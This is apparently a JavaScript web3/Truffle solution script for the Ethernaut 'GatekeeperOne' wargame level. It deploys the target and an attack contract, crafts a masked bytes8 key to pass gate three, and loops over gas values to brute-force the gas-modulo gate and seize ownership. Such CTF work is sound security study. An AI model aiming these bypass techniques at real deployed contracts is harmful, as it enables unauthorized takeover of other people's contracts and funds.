const fs = require('fs')
const solc = require('solc')

// https://medium.com/@mvmurthy/full-stack-hello-world-voting-ethereum-dapp-tutorial-part-1-40d2d0d807c2
// Compile version: v0.4.18+commit.9cf6e910

module.exports = function (callback) {
    // code = fs.readFileSync('contracts/GatekeeperOne.sol', 'utf8')
    console.log(solc.version())
    // console.log(web3.eth.accounts)
    // compiledCode = solc.compile(code)
    // byteCode = compiledCode.contracts[':GatekeeperOne'].bytecode

    // console.log(byteCode)
    code = fs.readFileSync('contracts/AttackGKO.sol', 'utf8')
    // console.log(solc.version())
    // console.log(web3.eth.accounts)
    compiledCode = solc.compile(code) // to get the ABI


    abiDefinition = JSON.parse(compiledCode.contracts[':GatekeeperOne'].interface)
    GatekeeperOneContract = web3.eth.contract(abiDefinition)
    // byteCode = compiledCode.contracts[':GatekeeperOne'].bytecode
    // deployed bytecode via Remix, choose correct compile version 0.4.18
    byteCode = "6060604052341561000f57600080fd5b6102cc8061001e6000396000f30060606040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633370204e146100515780639db31d77146100a7575b600080fd5b341561005c57600080fd5b61008d600480803577ffffffffffffffffffffffffffffffffffffffffffffffff19169060200190919050506100fc565b604051808215151515815260200191505060405180910390f35b34156100b257600080fd5b6100ba61027b565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60003273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415151561013957600080fd5b6000611fff5a81151561014857fe5b0614151561015557600080fd5b81807801000000000000000000000000000000000000000000000000900461ffff16817801000000000000000000000000000000000000000000000000900463ffffffff161415156101a657600080fd5b807801000000000000000000000000000000000000000000000000900467ffffffffffffffff16817801000000000000000000000000000000000000000000000000900463ffffffff16141515156101fd57600080fd5b3261ffff16817801000000000000000000000000000000000000000000000000900463ffffffff1614151561023157600080fd5b326000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506001915050919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16815600a165627a7a723058202c019d7d124c70b2bde5da7b15eb86c14a2c1643eb32161ca4c1b9c0efd847c30029"

    deployedContract = GatekeeperOneContract.new({
        data: byteCode,
        from: web3.eth.accounts[0],
        gas: 4700000
    }, (err, contract) => {
        if (!err) {
            if (contract.address) {
                let gko = contract.address;
                console.log("gko", gko)

                // code = fs.readFileSync('contracts/AttackGKO.sol', 'utf8')
                // console.log(solc.version())
                // console.log(web3.eth.accounts)
                // compiledCode = solc.compile(code)
                // console.log(compiledCode.contracts)

                abiDefinition = JSON.parse(compiledCode.contracts[':AttackGKO'].interface)
                AttackGKOContract = web3.eth.contract(abiDefinition)
                // byteCode = compiledCode.contracts[':AttackGKO'].bytecode
                // console.log(byteCode)
                // deployed bytecode via Remix, choose correct compile version 0.4.18
                byteCode = "6060604052341561000f57600080fd5b6101bd8061001e6000396000f300606060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680638766004c14610046575b600080fd5b341561005157600080fd5b6100a1600480803577ffffffffffffffffffffffffffffffffffffffffffffffff191690602001909190803573ffffffffffffffffffffffffffffffffffffffff169060200190919050506100bb565b604051808215151515815260200191505060405180910390f35b6000808290508073ffffffffffffffffffffffffffffffffffffffff16633370204e856000604051602001526040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808277ffffffffffffffffffffffffffffffffffffffffffffffff191677ffffffffffffffffffffffffffffffffffffffffffffffff19168152602001915050602060405180830381600087803b151561016e57600080fd5b6102c65a03f1151561017f57600080fd5b505050604051805190505050929150505600a165627a7a723058201c91a5561c290b726c6f98c3ca0c67b1cce0a54e81462ced06ba98ccf71c61d30029"
                deployedContract = AttackGKOContract.new({
                    data: byteCode,
                    from: web3.eth.accounts[0],
                    gas: 4700000
                }, (err, contract) => {
                    if (!err) {
                        if (contract.address) {
                            console.log("attack", contract.address)
                            let sign = web3.sha3("attack(bytes8,address)").slice(0, 10)
                            console.log(sign)
                            /*
                                0x62730609 0aba b3a6 e1400e9345bc60c78a8 bef57
                                0x62730609 0000 ef57 e1400e9345bc60c78a8 bef57
                                            null  |_________________________|
                                to pass gate3
                            */
                            let data = sign + "627306090000ef57e1400e9345bc60c78a8bef57000000000000000000000000000000000000000000000000" + gko.slice(2)
                            console.log(data)

                            let initialGas = 50800 // get rough gas from attack dummy contract that require(msg.gas % 8191 != 0);

                            for (let i = 0, p = Promise.resolve(); i < 200; i++) {
                                p = p.catch(_ => new Promise((reject, resolve) =>
                                    setTimeout(function () {
                                        web3.eth.sendTransaction({
                                            from: web3.eth.accounts[0],
                                            to: contract.address,
                                            data: data,
                                            gas: initialGas + i
                                        }, (err, rsp) => {
                                            if (err) {
                                                console.log(" catch fail", i)
                                                resolve([i, rsp])
                                            } else {
                                                console.log("catch ok", i, rsp) // -> bingo 50858 gas !!!
                                                resolve([i, rsp])
                                            }
                                        })
                                    }, Math.random() * 1000)
                                )).then(
                                    _ => new Promise((reject, resolve) =>
                                            setTimeout(function () {
                                                web3.eth.sendTransaction({
                                                    from: web3.eth.accounts[0],
                                                    to: contract.address,
                                                    data: data,
                                                    gas: initialGas + i
                                                }, (err, rsp) => {
                                                    if (err) {
                                                        console.log("then fail", i)
                                                        resolve([i, rsp])
                                                    } else {
                                                        console.log("then ok", i, rsp)
                                                        resolve([i, rsp])
                                                    }
                                                })
                                            }, Math.random() * 1000)
                                ));
                            }
                        }
                    } else {
                        console.log(err)
                    }
                })
            }
        } else {
            console.log(err)
        }
    })
}
